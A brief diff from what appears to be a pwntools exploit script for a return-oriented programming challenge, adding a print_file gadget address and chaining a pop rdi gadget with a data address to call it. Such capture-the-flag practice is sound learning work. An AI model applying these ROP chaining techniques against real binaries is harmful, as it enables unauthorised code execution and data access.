@@ -135,6 +135,7 @@ from pwn import *
 DATA = 0x601028
 RET = p64(0x400295) # ret
 POPRDI = p64(0x4006a3) # pop rdi ; ret
+PRINT_FILE = p64(0x400510) # print_file
 ...
 attack += POPRDI + p64(DATA) + PRINT_FILE
 ...
